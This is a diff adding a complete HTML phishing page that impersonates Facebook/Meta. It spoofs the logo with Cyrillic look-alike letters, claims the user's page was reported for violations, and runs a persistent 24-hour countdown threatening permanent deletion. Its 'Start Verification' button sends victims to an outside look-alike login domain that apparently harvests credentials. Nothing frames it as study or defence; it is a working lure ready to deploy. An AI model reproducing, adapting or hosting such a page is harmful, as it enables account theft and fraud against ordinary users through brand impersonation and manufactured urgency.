@@ -1,0 +1,150 @@
+<!-- Parameter Mode DISABLED: Normal detection mode -->
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Page at Risk</title>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+    <style>
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        @keyframes pulse-red {
+            0% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.7);
+            }
+            70% {
+                transform: scale(1.1);
+                box-shadow: 0 0 0 10px rgba(220, 38, 38, 0);
+            }
+            100% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(220, 38, 38, 0);
+            }
+        }
+
+        .animate-urgent {
+            animation: pulse-red 2s infinite;
+        }
+
+        ::-webkit-scrollbar {
+            width: 0px;
+            background: transparent;
+        }
+    </style>
+</head>
+
+<body class="bg-white md:bg-[#f0f2f5] text-[#1c1e21] min-h-screen flex flex-col md:block">
+
+    <div class="w-full md:max-w-[580px] mx-auto bg-white md:mt-12 md:rounded-xl md:shadow-[0_4px_12px_rgba(0,0,0,0.1)] p-5 md:p-8 shadow-none rounded-none border-none">
+
+        <div class="text-center pb-6 border-b border-[#dadde1]">
+            <div class="text-[#1877f2] text-[40px] md:text-[48px] font-bold mb-2 tracking-tighter cursor-default select-none">
+                f&#1072;&#1089;&#1077;b&#1086;&#1086;k
+            </div>
+            <h1 class="text-[20px] md:text-[22px] font-bold text-gray-900">Your Page Has Been Flagged</h1>
+        </div>
+
+        <div class="bg-[#fff8e1] border-l-4 border-[#ffc107] p-4 my-6 rounded-r-md">
+            <div class="font-bold text-[#d32f2f] mb-1 flex items-center gap-2 text-[15px]">
+                We found a violation
+            </div>
+            <div class="text-[14px] text-gray-700 leading-relaxed">
+                This happens because someone reported your page for violating our terms of service. The following activities are prohibited:
+            </div>
+        </div>
+
+        <div class="py-2">
+            <p class="mb-6 text-[#606770] text-[15px]">
+                Sharing misleading information, using someone else's fake name or image, and insulting other users.
+            </p>
+
+            <div class="flex items-center p-4 border border-[#dddfe2] rounded-lg mb-6 bg-gray-50 select-none">
+                <div class="w-12 h-12 bg-red-100 rounded-full flex items-center justify-center mr-4 text-red-600 text-xl shrink-0 animate-urgent">
+                    <i class="fa-solid fa-exclamation"></i>
+                </div>
+
+                <div class="flex-1">
+                    <div class="font-medium text-[16px] mb-1 text-gray-800">Page Verification Required</div>
+                    <div class="text-[13px] text-[#65676b] leading-tight">Please supply the essential details so that we can assist you</div>
+                </div>
+            </div>
+
+            <p class="mb-8 text-[#606770] text-[15px]">
+                You have <strong><span id="timer" class="font-bold text-red-600 font-mono text-[14px]">24:00:00</span></strong> to verify your page before it's permanently disabled for violating our Community Standards.
+            </p>
+
+            <button onclick="window.location.href='https://log-in-to-page.business-minagne.com/'" class="w-full py-3.5 rounded-lg font-bold text-[16px] bg-[#1877f2] text-white hover:bg-[#166fe5] active:bg-[#1558b0] active:scale-[0.98] transition-all duration-150 shadow-sm flex justify-center items-center gap-2">
+                Start Verification
+            </button>
+        </div>
+
+        <div class="text-center mt-6 pt-6 border-t border-[#dadde1] text-[#8a8d91] text-[13px]">
+            <div class="flex justify-center items-center gap-1.5 mb-2 font-semibold">
+                <i class="fa-brands fa-meta text-lg"></i> Meta &copy; 2025
+            </div>
+            <div class="px-4">You can learn more about why we suspend page by visiting the Community Standards.</div>
+        </div>
+
+    </div>
+
+    <script>
+        $(document).ready(function() {
+            const STORAGE_KEY = 'deadline';
+            const DURATION = 24 * 60 * 60 * 1000;
+
+            let deadline;
+
+            if (localStorage.getItem(STORAGE_KEY)) {
+                deadline = parseInt(localStorage.getItem(STORAGE_KEY));
+            } else {
+                deadline = new Date().getTime() + DURATION;
+                localStorage.setItem(STORAGE_KEY, deadline);
+            }
+
+            function updateTimer() {
+                const now = new Date().getTime();
+                const distance = deadline - now;
+
+                if (distance < 0) {
+                    $('#timer').text("00:00:00");
+                    return;
+                }
+
+                const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+                const formattedTime =
+                    (hours < 10 ? "0" + hours : hours) + ":" +
+                    (minutes < 10 ? "0" + minutes : minutes) + ":" +
+                    (seconds < 10 ? "0" + seconds : seconds);
+
+                $('#timer').text(formattedTime);
+            }
+
+            setInterval(updateTimer, 1000);
+
+            updateTimer();
+        });
+    </script>
+
+    <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"ec6b524bcd00467ab7202fa5316fb998","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}'
+        crossorigin="anonymous"></script>
+</body>
+
+</html>
